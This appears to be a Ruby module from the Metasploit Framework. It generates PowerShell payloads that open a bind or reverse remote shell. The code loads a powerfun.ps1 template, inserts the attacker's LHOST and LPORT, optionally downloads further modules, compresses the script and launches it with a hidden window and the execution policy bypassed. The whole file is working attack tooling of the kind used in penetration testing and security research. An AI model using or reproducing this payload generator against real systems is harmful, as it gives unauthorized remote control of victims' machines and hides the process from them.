# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows'

module Msf

###
#
# Implements an overarching powershell payload generation module
#
###

module Payload::Windows::Powershell

  def generate_powershell_code(conntype)
    lport = datastore['LPORT']
    lhost = datastore['LHOST']

    template_path = ::File.join( Msf::Config.data_directory, 'exploits', 'powershell','powerfun.ps1')
    script_in = ""
    ::File.open(template_path, "rb") do |fd|
      script_in << fd.read(fd.stat.size)
    end
    mods = ''

    if conntype == "Bind"
      script_in << "\npowerfun -Command bind"
    elsif conntype == "Reverse"
      script_in << "\npowerfun -Command reverse -Sslcon true"
    end

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << " -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)
    script_in.gsub!('LHOST_REPLACE', lhost.to_s)

    script = Rex::Powershell::Command.compress_script(script_in)
    command_args = { 
        noprofile: true,
        windowstyle: 'hidden',
        noninteractive: true,
        executionpolicy: 'bypass'
    }
    cli =  Rex::Powershell::Command.generate_psh_command_line(command_args)
    return "#{cli} \"#{script}\""
  end

  def command_string
    powershell_command
  end
end
end

